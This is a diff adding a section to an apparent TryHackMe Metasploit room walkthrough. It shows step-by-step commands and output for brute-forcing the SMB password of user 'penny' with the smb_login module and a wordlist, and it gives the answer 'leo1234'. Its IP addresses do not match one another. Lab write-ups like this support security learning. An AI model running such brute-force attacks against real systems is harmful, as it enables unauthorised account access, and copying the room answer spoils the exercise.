@@ -206,3 +206,147 @@ webfs = a very small web server.
 Version 1.21 is running.
 
 ⸻
+
+## 🧠 PART 4 — Find penny’s SMB password using Metasploit + wordlist
+
+### What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.
+
+You used a password wordlist (provided by THM).
+You brute-forced the SMB login.
+
+### ✔ In Metasploit
+```bash
+msf6 > search smb login
+
+Matching Modules
+================
+
+   #   Name                                                Disclosure Date  Rank       Check  Description
+   -   ----                                                ---------------  ----       -----  -----------
+   0   exploit/windows/smb/ms04_007_killbill               2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
+   1   exploit/windows/smb/smb_relay                       2001-03-31       excellent  Yes    MS08-068 Microsoft Windows SMB Relay Code Execution
+   2     \_ action: CREATE_SMB_SESSION                     .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
+   3     \_ action: PSEXEC                                 .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
+   4     \_ target: Automatic                              .                .          .      .
+   5     \_ target: PowerShell                             .                .          .      .
+   6     \_ target: Native upload                          .                .          .      .
+   7     \_ target: MOF upload                             .                .          .      .
+   8     \_ target: Command                                .                .          .      .
+   9   exploit/windows/smb/ms17_010_eternalblue            2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   10    \_ target: Automatic Target                       .                .          .      .
+   11    \_ target: Windows 7                              .                .          .      .
+   12    \_ target: Windows Embedded Standard 7            .                .          .      .
+   13    \_ target: Windows Server 2008 R2                 .                .          .      .
+   14    \_ target: Windows 8                              .                .          .      .
+   15    \_ target: Windows 8.1                            .                .          .      .
+   16    \_ target: Windows Server 2012                    .                .          .      .
+   17    \_ target: Windows 10 Pro                         .                .          .      .
+   18    \_ target: Windows 10 Enterprise Evaluation       .                .          .      .
+   19  exploit/windows/smb/smb_shadow                      2021-02-16       manual     No     Microsoft Windows SMB Direct Session Takeover
+   20  auxiliary/scanner/smb/smb_login                     .                normal     No     SMB Login Check Scanner
+   21  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt       .                normal     No     SMB NTLMv1 Login Request Corruption
+   22  exploit/multi/http/pgadmin_session_deserialization  2024-03-04       excellent  Yes    pgAdmin Session Deserialization RCE
+
+
+Interact with a module by name or index. For example info 22, use 22 or use exploit/multi/http/pgadmin_session_deserialization
+```
+
+### Use auxiliary/scanner/smb/smb_login
+```bash
+msf6 > use 20
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+```
+### Check the available options:
+```bash
+msf6 auxiliary(scanner/smb/smb_login) > show options 
+
+Module options (auxiliary/scanner/smb/smb_login):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
+   ANONYMOUS_LOGIN    false            yes       Attempt to login with a blank username and passwo
+                                                 rd
+   BLANK_PASSWORDS    false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
+   CreateSession      false            no        Create a new session for every successful login
+   DB_ALL_CREDS       false            no        Try each user/password couple stored in the curre
+                                                 nt database
+   DB_ALL_PASS        false            no        Add all passwords in the current database to the
+                                                 list
+   DB_ALL_USERS       false            no        Add all users in the current database to the list
+   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current d
+                                                 atabase (Accepted: none, user, user&realm)
+   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authent
+                                                 ication
+   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified us
+                                                 er
+   PASS_FILE                           no        File containing passwords, one per line
+   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
+   Proxies                             no        A proxy chain of format type:host:port[,type:host
+                                                 :port][...]
+   RECORD_GUEST       false            no        Record guest-privileged random logins to the data
+                                                 base
+   RHOSTS                              yes       The target host(s), see https://docs.metasploit.c
+                                                 om/docs/using-metasploit/basics/using-metasploit.
+                                                 html
+   RPORT              445              yes       The SMB service port (TCP)
+   SMBDomain          .                no        The Windows domain to use for authentication
+   SMBPass                             no        The password for the specified username
+   SMBUser                             no        The username to authenticate as
+   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
+   THREADS            1                yes       The number of concurrent threads (max one per hos
+                                                 t)
+   USERPASS_FILE                       no        File containing users and passwords separated by
+                                                 space, one pair per line
+   USER_AS_PASS       false            no        Try the username as the password for all users
+   USER_FILE                           no        File containing usernames, one per line
+   VERBOSE            true             yes       Whether to print output for all attempts
+
+
+View the full module info with the info, or info -d command.
+```
+### Set Target IP Host:
+```bash
+msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 190.161.214.185
+rhost => 190.161.214.185
+```
+
+### Set the username to authenticate as:
+```bash
+msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER penny
+SMBUSER => penny
+```
+
+### Set the file containing passwords:
+```bash
+msf6 auxiliary(scanner/smb/smb_login) > set pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
+pass_file => /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
+```
+### Set the number of concurrent threads (max one per host)
+```bash
+msf6 auxiliary(scanner/smb/smb_login) > set ThREADS 10
+ThREADS => 10
+```
+### Run
+```bash
+[-] 190.161.214.185:445     - 10.64.152.38:445 - Failed: '.\penny:god',
+[-] 190.161.214.185:445     - 10.64.152.38:445 - Failed: '.\penny:guessme',
+.
+.
+.
+[-] 190.161.214.185:445      - 10.64.152.38:445 - Failed: '.\penny:hugs',
+[-] 190.161.214.185:445      - 10.64.152.38:445 - Failed: '.\penny:letmein',
+[+] 190.161.214.185:445    - 10.64.152.38:445 - Success: '.\penny:leo1234'
+[*] 190.161.214.185:445      - Scanned 1 of 1 hosts (100% complete)
+[*] 190.161.214.185:445    - Bruteforce completed, 1 credential was successful.
+[*] 190.161.214.185:445      - You can open an SMB session with these credentials and CreateSession set to true
+[*] Auxiliary module execution completed
+```
+
+### ✔ Output example:
+[+] 10.201.114.15:445 - Success: 'penny:leo1234'
+
+So the password → **leo1234**
+
+⸻
